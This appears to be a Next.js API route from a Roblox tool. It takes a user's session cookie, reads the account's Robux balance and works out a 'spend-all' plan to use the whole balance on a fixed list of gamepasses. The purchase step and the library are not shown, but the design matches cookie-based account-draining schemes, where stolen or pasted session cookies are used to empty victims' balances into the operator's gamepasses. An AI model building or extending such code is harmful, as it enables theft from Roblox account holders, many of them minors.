import { NextResponse } from 'next/server';

export async function POST(request) {
    try {
        const { Info, PERMANENT_GAMEPASSES } = await import('../../../lib/gamepass.js');
        
        const { cookie } = await request.json();
        
        if (!cookie) {
            return NextResponse.json(
                { error: 'Missing cookie parameter' },
                { status: 400 }
            );
        }

        // Get balance
        const balance = await Info.getRobuxBalance(cookie);
        
        // Calculate purchase plan using SPEND ALL strategy
        const purchases = [];
        let remainingBalance = balance;
        
        // Sort by most expensive first
        const sortedGamepasses = [...PERMANENT_GAMEPASSES].sort((a, b) => b.price - a.price);
        
        // Try to spend all Robux
        for (const gamepass of sortedGamepasses) {
            if (remainingBalance >= gamepass.price) {
                const maxPurchases = Math.floor(remainingBalance / gamepass.price);
                
                if (maxPurchases > 0) {
                    let quantityToBuy = gamepass.price >= 1000 ? 1 : maxPurchases;
                    
                    // Adjust for better spending
                    const wouldRemain = remainingBalance - (gamepass.price * quantityToBuy);
                    if (wouldRemain > 0 && wouldRemain < 100) {
                        quantityToBuy = 1;
                    } else if (gamepass.price === 500 && remainingBalance >= 500) {
                        quantityToBuy = Math.min(maxPurchases, Math.ceil(remainingBalance / 500));
                    }
                    
                    purchases.push({
                        id: gamepass.id,
                        name: gamepass.name,
                        price: gamepass.price,
                        quantity: quantityToBuy,
                        totalCost: gamepass.price * quantityToBuy
                    });
                    remainingBalance -= gamepass.price * quantityToBuy;
                }
            }
        }
        
        // Try to use remaining balance on cheaper gamepasses
        if (remainingBalance > 0) {
            const cheapGamepasses = [...PERMANENT_GAMEPASSES].sort((a, b) => a.price - b.price);
            for (const gamepass of cheapGamepasses) {
                if (remainingBalance >= gamepass.price) {
                    const maxPurchases = Math.floor(remainingBalance / gamepass.price);
                    if (maxPurchases > 0) {
                        purchases.push({
                            id: gamepass.id,
                            name: gamepass.name,
                            price: gamepass.price,
                            quantity: maxPurchases,
                            totalCost: gamepass.price * maxPurchases
                        });
                        remainingBalance -= gamepass.price * maxPurchases;
                    }
                }
                if (remainingBalance <= 0) break;
            }
        }

        // Create summary message
        let message = "Will spend all available Robux";
        if (purchases.length > 0) {
            const itemsSummary = purchases.map(p => 
                `${p.quantity}× ${p.name}`
            ).join(', ');
            message = `Will purchase: ${itemsSummary} for ${balance - remainingBalance} Robux`;
        }

        return NextResponse.json({
            success: true,
            balance: balance,
            gamepasses: PERMANENT_GAMEPASSES,
            purchasePlan: {
                purchases,
                totalSpent: balance - remainingBalance,
                remainingBalance,
                originalBalance: balance,
                strategy: "spend-all"
            },
            message: purchases.length > 0 
                ? message
                : "Not enough Robux for any gamepass"
        });

    } catch (error) {
        console.error('Balance API Error:', error);
        return NextResponse.json(
            { 
                success: false,
                error: 'Failed to fetch balance. Check your cookie.'
            },
            { status: 500 }
        );
    }
}
